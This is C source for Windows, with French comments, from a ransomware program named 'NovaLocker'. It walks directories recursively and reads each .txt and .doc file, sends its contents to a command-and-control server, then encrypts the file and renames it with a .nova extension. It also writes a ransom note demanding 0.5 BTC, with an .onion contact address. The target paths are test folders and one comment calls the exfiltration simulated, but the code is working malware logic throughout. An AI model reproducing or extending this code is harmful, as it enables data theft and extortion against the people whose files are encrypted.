#include "../include/file_ops.h"
#include "../include/crypto.h"
#include "../include/network.h"

BOOL StartFileEncryption() {
    printf("[FILES] Starting file encryption process...\n");

    // Dossiers cibles pour les tests
    LPCWSTR test_dirs[] = {
        L"C:\\temp\\test_files",
        L"C:\\Users\\%USERNAME%\\Desktop\\test_nova",
        NULL
    };

    for (int i = 0; test_dirs[i] != NULL; i++) {
        WCHAR expanded_path[MAX_PATH];
        ExpandEnvironmentStringsW(test_dirs[i], expanded_path, MAX_PATH);

        printf("[FILES] Processing directory: %ws\n", expanded_path);
        EnumerateFiles(expanded_path);
    }

    printf("[FILES] Encryption completed. Files processed: %d\n", g_files_processed);
    return TRUE;
}

BOOL EnumerateFiles(LPCWSTR root_path) {
    WIN32_FIND_DATAW find_data;
    WCHAR search_path[MAX_PATH_LEN];
    WCHAR full_path[MAX_PATH_LEN];

    swprintf_s(search_path, MAX_PATH_LEN, L"%s\\*", root_path);

    HANDLE hFind = FindFirstFileW(search_path, &find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[FILES] Directory not found: %ws\n", root_path);
        return FALSE;
    }

    do {
        if (wcscmp(find_data.cFileName, L".") == 0 || wcscmp(find_data.cFileName, L"..") == 0) {
            continue;
        }

        swprintf_s(full_path, MAX_PATH_LEN, L"%s\\%s", root_path, find_data.cFileName);

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Récursion dans les sous-dossiers
            EnumerateFiles(full_path);
        } else {
            // Vérifier l'extension
            LPCWSTR ext = wcsrchr(find_data.cFileName, L'.');
            if (ext && (wcsicmp(ext, L".txt") == 0 || wcsicmp(ext, L".doc") == 0)) {

                // Envoyer le fichier original au C2 avant chiffrement
                SendFileToC2(full_path);

                // Chiffrer le fichier
                if (EncryptFileSimple(full_path)) {
                    // Renommer avec extension .nova
                    WCHAR nova_path[MAX_PATH_LEN];
                    swprintf_s(nova_path, MAX_PATH_LEN, L"%s.nova", full_path);
                    MoveFileW(full_path, nova_path);
                    printf("[FILES] Renamed to: %ws\n", nova_path);
                }
            }
        }
    } while (FindNextFileW(hFind, &find_data));

    FindClose(hFind);
    return TRUE;
}

BOOL SendFileToC2(LPCWSTR file_path) {
    // Simuler l'exfiltration
    printf("[FILES] Exfiltrating: %ws\n", file_path);

    HANDLE hFile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE* file_data = (BYTE*)malloc(file_size);
    DWORD bytes_read;

    if (ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
        SendDataToC2(file_data, file_size);
    }

    free(file_data);
    CloseHandle(hFile);
    return TRUE;
}

BOOL CreateRansomNote() {
    printf("[FILES] Creating ransom note...\n");

    HANDLE hNote = CreateFileW(L"C:\\temp\\NOVA_RECOVERY_INSTRUCTIONS.txt",
                               GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNote == INVALID_HANDLE_VALUE) return FALSE;

    const char* note =
        "=== NovaLocker Recovery Instructions ===\n"
        "Your files have been encrypted for security.\n"
        "Contact: recovery@nova-labs.onion\n"
        "Payment: 0.5 BTC to recover your data\n"
        "\n"
        "Files affected: Project Pulsar documents\n"
        "Encryption: Military-grade AES-256\n";

    DWORD written;
    WriteFile(hNote, note, strlen(note), &written, NULL);
    CloseHandle(hNote);

    printf("[FILES] Ransom note created\n");
    return TRUE;
}
